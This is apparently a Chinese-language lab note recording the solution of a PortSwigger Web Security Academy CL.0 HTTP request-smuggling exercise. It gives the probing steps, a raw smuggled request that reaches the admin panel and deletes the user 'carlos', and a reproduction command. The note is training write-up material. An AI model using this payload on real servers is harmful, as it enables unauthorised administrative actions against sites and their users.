---
title: "lab-cl-0-request-smuggling"
links:
  - target: request-smuggling-family
    relation: evidences
  - target: h2-smuggling-family
    relation: relates
---

# lab-cl-0-request-smuggling

> evidences: [[request-smuggling-family]]

PortSwigger `request-smuggling/browser/cl-0/lab-cl-0-request-smuggling`(第 29 批,2026-10-06)。

- 实例:`https://0a360085048f431480084e0a00ec0025.web-security-academy.net/`(`lab_id D8868635…`)。
- 判定:**solved**(`solved_check` → `is-solved` + `Congratulations, you solved the lab!`)。

## 关键步(件:conn_reuse)

1. 找 CL.0 面:对候选路径发 `POST <path>` + `Content-Length: 91` + body=`GET /404probe HTTP/1.1\r\nHost: <inst>\r\n\r\n`,
   再在同一连接发一个普通请求。命中 `/image/blog/posts/16.jpg`:①`405 Method Not Allowed`(`Allow: GET`)
   ②body 里的走私请求被执行 → `404 "Not Found: /404probe"`(证明 back-end 对静态图片路径忽略 CL)。
   `/`、`/resources/images/blog.svg` 不成立(有 200 回包、无 404)。
2. 收口(一次 conn_reuse,两条 literal,不必等 victim):
   ```
   POST /image/blog/posts/16.jpg HTTP/1.1
   Host: <inst>
   Content-Length: 63

   GET /admin/delete?username=carlos HTTP/1.1
   Host: localhost
   ```
   紧随第二个请求(任意 `GET /?cb=N`)把队列里的响应取出 → 回包流里出现 `200` + `Content-Length: 11464` 管理面板。
3. 第二次跑同一帧即删掉 carlos;`solved_check` 翻 true。

## 要点

- 前端(h1)把同一客户端连接的请求复用同一 back-end 连接;走私**完整**请求即可,响应按 FIFO 落到下一请求。
  与 h2 splitting(批 20)同构,但这里是纯 h1 CL.0 面。
- 走私请求必须自带 `Host: localhost`(back-end 用它判"本地")。第二个请求纯粹是"把队列里的响应取出来"。
- 探测技巧:连发两条 literal,不要用 `--sequential`——观察第 2 条的 status 是否被"顶替"。

## 复现命令

```
conn_reuse <inst>/image/blog/posts/16.jpg --send-str 'POST /image/blog/posts/16.jpg HTTP/1.1\r\nHost: <HOST>\r\nContent-Length: 63\r\nConnection: keep-alive\r\n\r\nGET /admin/delete?username=carlos HTTP/1.1\r\nHost: localhost\r\n\r\n' --send-str 'GET /?cb=1 HTTP/1.1\r\nHost: <HOST>\r\n\r\n' --read-ms 3000
```
